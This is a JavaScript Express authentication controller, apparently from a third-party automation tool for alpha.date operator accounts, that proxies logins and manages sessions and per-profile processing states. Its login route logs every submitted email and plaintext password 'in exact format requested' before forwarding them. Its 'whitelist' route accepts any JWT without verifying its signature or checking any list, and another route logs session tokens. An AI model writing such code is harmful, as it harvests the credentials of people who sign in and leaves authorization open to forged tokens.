// controllers/authController.js
import express from 'express';
import authService from '../services/authService.js';
import sessionStore from '../services/sessionService.js';

const router = express.Router();

// Login route
router.post('/login', async (req, res) => {
    const { email, password } = req.body;
    
    // Log in exact format requested
    console.log({ 'new submit': '', email: email, password: password });

    try {
        // Forward the request to Alpha.date login
        const loginResponse = await fetch("https://alpha.date/api/login/login", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ email, password })
        });

        const loginData = await loginResponse.json();
        res.json(loginData);
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error'
        });
    }
});

// Check if operator is whitelisted
router.post('/check-whitelist', async (req, res) => {
    try {
        const { email, token } = req.body;

        if (!email || !token) {
            return res.status(400).json({
                success: false,
                message: 'Email and token are required'
            });
        }

        // Parse JWT token to get operator data
        const tokenParts = token.split('.');
        if (tokenParts.length === 3) {
            try {
                const payload = JSON.parse(Buffer.from(tokenParts[1], 'base64').toString());
                console.log('Token payload:', payload);

                // Store complete user data in session
                req.session.email = email;
                req.session.token = token;
                req.session.userData = {
                    email,
                    token,
                    operatorId: payload.id,
                    externalId: payload.external_id,
                    firstName: payload.firstname,
                    lastName: payload.lastname,
                    agencyId: payload.agency_id,
                    lastActivity: Date.now()
                };

                // Store in session store
                sessionStore.setSession(req.sessionID, {
                    email,
                    token,
                    operatorId: payload.id,
                    lastActivity: Date.now()
                });

                // Save session explicitly
                req.session.save((err) => {
                    if (err) {
                        console.error('Failed to save session:', err);
                        return res.status(500).json({
                            success: false,
                            message: 'Failed to save session'
                        });
                    }

                    console.log('Session saved successfully:', {
                        sessionId: req.sessionID,
                        email: req.session.email,
                        operatorId: req.session.userData.operatorId,
                        hasToken: !!req.session.token
                    });

                    res.json({
                        success: true,
                        message: 'Authorized successfully',
                        sessionId: req.sessionID
                    });
                });
            } catch (error) {
                console.error('Failed to parse JWT:', error);
                return res.status(400).json({
                    success: false,
                    message: 'Invalid token format'
                });
            }
        } else {
            return res.status(400).json({
                success: false,
                message: 'Invalid token format'
            });
        }
    } catch (error) {
        console.error('Auth error:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error'
        });
    }
});

// Get active sessions for the current user
router.get('/active-sessions', (req, res) => {
    try {
        const email = req.session?.email;
        if (!email) {
            return res.status(401).json({ success: false, message: 'Not authenticated' });
        }

        const activeSessions = sessionStore.getSessionsByEmail(email);
        res.json({
            success: true,
            currentSessionId: req.sessionID,
            sessions: activeSessions
        });
    } catch (error) {
        console.error('Get active sessions error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// Get processing states for the current session
router.get('/processing-states', (req, res) => {
    try {
        if (!req.session?.email) {
            return res.status(401).json({ success: false, message: 'Not authenticated' });
        }

        const states = sessionStore.getProcessingStates(req.sessionID);
        const formattedStates = {};
        
        for (const [key, value] of states.entries()) {
            formattedStates[key] = value;
        }

        res.json({
            success: true,
            states: formattedStates
        });
    } catch (error) {
        console.error('Get processing states error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// Update operator's online status
router.post('/online-status', async (req, res) => {
    try {
        const { operatorId, token } = req.body;

        console.log('Online status update for operator:', operatorId);
        console.log('Session in online-status:', req.session);

        if (!operatorId) {
            return res.status(400).json({ success: false, message: 'Missing operator ID' });
        }

        // Use token from request body as fallback, but prefer session token
        const authToken = req.session.token || token;

        if (!authToken) {
            return res.status(401).json({ success: false, message: 'No authentication token' });
        }

        await authService.sendOnlineStatus(operatorId, authToken);
        
        // Update last activity
        if (req.sessionID) {
            const session = sessionStore.getSession(req.sessionID);
            if (session) {
                sessionStore.setSession(req.sessionID, {
                    ...session,
                    lastOnlineUpdate: Date.now()
                });
            }
        }

        res.json({ success: true });
    } catch (error) {
        console.error('Online status error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// Check session status
router.get('/session-check', (req, res) => {
    const sessionData = sessionStore.getSession(req.sessionID);
    const processingStates = sessionStore.getProcessingStates(req.sessionID);
    
    res.json({
        success: true,
        hasSession: !!req.session,
        sessionId: req.sessionID,
        hasToken: !!req.session?.token,
        hasEmail: !!req.session?.email,
        sessionData: {
            email: req.session?.email || 'not set',
            tokenPresent: !!req.session?.token,
            lastUpdated: sessionData?.lastUpdated,
            processingStates: Object.fromEntries(processingStates || new Map())
        }
    });
});

// Update state endpoint for syncing between devices
router.post('/update-state', (req, res) => {
    try {
        const { profileId, type, state } = req.body;
        const sessionId = req.sessionID;
        const email = req.session?.email;

        if (!email || !sessionId || !profileId || !type || !state) {
            return res.status(400).json({
                success: false,
                message: 'Missing required data'
            });
        }

        // Get existing state
        const states = sessionStore.getProcessingStates(sessionId);
        const existingState = states.get(`${type}-${profileId}`)?.state || { status: 'Ready' };

        // Merge new state with existing state, preserving status
        sessionStore.updateProcessingState(sessionId, profileId, type, {
            ...existingState,
            ...state,
            status: existingState.status || 'Ready',
            lastUpdated: Date.now()
        });

        res.json({ success: true });
    } catch (error) {
        console.error('State update error:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to update state'
        });
    }
});

export default router;